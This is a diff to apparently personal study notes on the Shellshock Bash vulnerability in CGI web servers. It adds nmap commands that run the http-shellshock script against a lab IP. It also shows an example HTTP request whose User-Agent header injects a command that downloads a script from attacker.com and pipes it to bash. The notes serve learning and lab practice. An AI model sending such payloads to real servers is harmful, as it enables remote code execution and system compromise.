@@ -1,12 +1,15 @@
+locate nse | grep shellshock  --> to find shellshock in the nmap scan
+nmap -sv -p80 --script= http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56
+
 1. Web Servers Using CGI Scripts
 
     Many web servers (e.g., Apache, NGINX) support Common Gateway Interface (CGI) scripts to handle HTTP requests.
     If CGI scripts invoke Bash, attackers can inject commands via HTTP headers like User-Agent or Referer.
 
 Example Exploit via HTTP Request:
-    GET /cgi-bin/test.cgi HTTP/1.1
+    `GET /cgi-bin/test.cgi HTTP/1.1
     Host: vulnerable.com
-    User-Agent: () { :; }; /bin/bash -c "curl http://attacker.com/malware.sh | bash"
+    User-Agent: () { :; }; /bin/bash -c "curl http://attacker.com/malware.sh | bash"`
 
 Vulnerable Scenarios:
     Legacy systems running CGI scripts in Bash.
